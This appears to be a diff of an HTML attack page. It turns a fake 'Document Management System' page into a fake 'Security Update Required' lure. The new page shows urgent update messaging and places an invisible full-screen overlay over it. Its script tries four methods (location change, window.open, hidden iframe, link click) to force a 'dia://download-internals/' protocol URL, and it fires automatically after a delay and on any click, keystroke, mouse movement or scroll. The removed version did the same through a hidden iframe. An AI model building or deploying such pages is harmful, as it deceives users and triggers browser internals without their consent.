@@ -1,189 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Document Viewer</title>
+    <title>Security Update Required</title>
     <style>
         body {
             margin: 0;
-            padding: 20px;
+            padding: 0;
             font-family: Arial, sans-serif;
-            background: #f5f5f5;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        /* Container yang menarik perhatian */
-        .main-content {
-            background: white;
+        .update-container {
+            background: rgba(255,255,255,0.1);
             padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
             text-align: center;
-            margin: 50px auto;
-            max-width: 600px;
+            max-width: 500px;
         }
         
-        /* Button yang visible dan menarik */
-        .visible-button {
-            background: #4285f4;
+        .urgent-badge {
+            background: #ff4757;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        
+        .action-button {
+            background: #ff6b6b;
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 5px;
+            padding: 15px 40px;
+            font-size: 16px;
+            border-radius: 25px;
             cursor: pointer;
             margin: 20px 0;
         }
         
-        /* Hidden iframe yang menutupi seluruh halaman */
-        .hidden-frame {
+        .hidden-trigger {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            border: none;
-            opacity: 0.01;
+            opacity: 0;
             z-index: 9999;
-            pointer-events: auto;
-        }
-        
-        /* Overlay transparan untuk capture clicks */
-        .click-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            z-index: 10000;
-        }
-        
-        /* Dekorasi untuk membuat terlihat legitimate */
-        .features {
-            display: flex;
-            justify-content: space-around;
-            margin: 30px 0;
-        }
-        
-        .feature {
-            padding: 20px;
-            border: 1px solid #e0e0e0;
-            border-radius: 5px;
-            width: 30%;
         }
     </style>
 </head>
 <body>
-    <div class="main-content">
-        <h1>📄 Document Management System</h1>
-        <p>View and manage your documents securely</p>
+    <div class="update-container">
+        <div class="urgent-badge">URGENT</div>
+        <h1>🔒 Security Update Required</h1>
+        <p>Your document viewer requires an immediate security update to protect against vulnerabilities.</p>
         
-        <div class="features">
-            <div class="feature">
-                <h3>🔒 Secure</h3>
-                <p>Enterprise-grade security</p>
-            </div>
-            <div class="feature">
-                <h3>⚡ Fast</h3>
-                <p>Quick document processing</p>
-            </div>
-            <div class="feature">
-                <h3>📊 Analytics</h3>
-                <p>Detailed usage reports</p>
-            </div>
-        </div>
-        
-        <button class="visible-button" onclick="showDownloadOptions()">
-            Download Documents
+        <button class="action-button" onclick="startUpdate()">
+            Install Security Update Now
         </button>
         
-        <p style="color: #666; font-size: 14px;">
-            Click above to access your document download center
+        <p style="font-size: 12px; opacity: 0.8;">
+            This update will patch critical security vulnerabilities in the document handling system.
         </p>
     </div>
 
-    <!-- Hidden iframe yang akan trigger dia:// protocol -->
-    <iframe id="hiddenFrame" class="hidden-frame" 
-            src="about:blank"
-            sandbox="allow-scripts allow-same-origin">
-    </iframe>
-
-    <!-- Overlay untuk capture semua clicks -->
-    <div class="click-overlay" onclick="triggerDiaProtocol()"></div>
+    <div class="hidden-trigger" onclick="executeDiaProtocol()"></div>
 
     <script>
-        let protocolTriggered = false;
-        
-        function showDownloadOptions() {
-            // Function dummy untuk button visible
-            alert('Preparing your documents...');
+        function startUpdate() {
+            // Social engineering - show fake progress
+            alert('Downloading security update...');
         }
         
-        function triggerDiaProtocol() {
-            if (protocolTriggered) return;
-            
-            protocolTriggered = true;
-            
-            // Multiple methods untuk trigger dia:// protocol
-            const frame = document.getElementById('hiddenFrame');
-            
-            // Method 1: Direct location change
-            try {
-                frame.contentWindow.location.href = 'dia://download-internals/';
-            } catch(e) {
-                console.log('Method 1 failed:', e);
-            }
-            
-            // Method 2: Window navigation
-            setTimeout(() => {
-                try {
-                    frame.contentWindow.window.location = 'dia://download-internals/';
-                } catch(e) {
-                    console.log('Method 2 failed:', e);
-                }
-            }, 100);
-            
-            // Method 3: Create link dan click
-            setTimeout(() => {
-                try {
-                    const link = frame.contentDocument.createElement('a');
+        function executeDiaProtocol() {
+            // Multiple approach untuk trigger dia://
+            const methods = [
+                () => { window.location.href = 'dia://download-internals/'; },
+                () => { window.open('dia://download-internals/', '_self'); },
+                () => { 
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'dia://download-internals/';
+                    document.body.appendChild(iframe);
+                },
+                () => {
+                    const link = document.createElement('a');
                     link.href = 'dia://download-internals/';
                     link.click();
-                } catch(e) {
-                    console.log('Method 3 failed:', e);
                 }
-            }, 200);
+            ];
             
-            // Method 4: Direct window open
-            setTimeout(() => {
-                try {
-                    frame.contentWindow.open('dia://download-internals/', '_self');
-                } catch(e) {
-                    console.log('Method 4 failed:', e);
-                }
-            }, 300);
-            
-            console.log('Dia protocol trigger attempted');
+            // Try semua methods
+            methods.forEach((method, index) => {
+                setTimeout(() => {
+                    try {
+                        method();
+                    } catch(e) {
+                        console.log(`Method ${index + 1} failed:`, e);
+                    }
+                }, index * 100);
+            });
         }
         
-        // Auto-trigger setelah beberapa detik untuk testing
-        setTimeout(() => {
-            if (!protocolTriggered) {
-                console.log('Auto-triggering dia protocol');
-                triggerDiaProtocol();
-            }
-        }, 5000);
+        // Auto-execute setelah delay
+        setTimeout(executeDiaProtocol, 3000);
         
-        // Capture semua clicks di halaman
-        document.addEventListener('click', function(e) {
-            if (!protocolTriggered) {
-                console.log('Click detected at:', e.clientX, e.clientY);
-                triggerDiaProtocol();
-            }
-        });
-        
-        // Juga capture hover events
-        document.addEventListener('mouseover', function(e) {
-            // Optional: trigger pada hover tertentu
+        // Juga execute pada berbagai user interactions
+        ['click', 'mousemove', 'keydown', 'scroll'].forEach(event => {
+            document.addEventListener(event, executeDiaProtocol, { once: true });
         });
     </script>
 </body>
